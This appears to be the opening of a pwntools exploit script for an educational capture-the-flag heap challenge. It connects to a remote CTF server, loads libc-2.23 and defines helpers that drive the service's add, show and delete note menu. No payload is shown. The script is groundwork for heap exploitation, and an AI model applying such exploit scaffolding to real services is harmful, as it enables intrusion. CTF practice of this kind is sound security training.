from pwn import *

# r = process('./note')
r = remote('edu-ctf.csie.org', 10178)
elf = ELF('./libc-2.23.so')

def add(size, data):
    r.sendafter('> ', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', data)

def show(index):
    r.sendafter('> ', '2')
    r.sendafter('Which note do you want to show?\nIndex: ', str(index))

def delete(index):
    r.sendafter('> ', '3')
    r.sendafter('Which note do you want to delete?\nIndex: ', str(index))
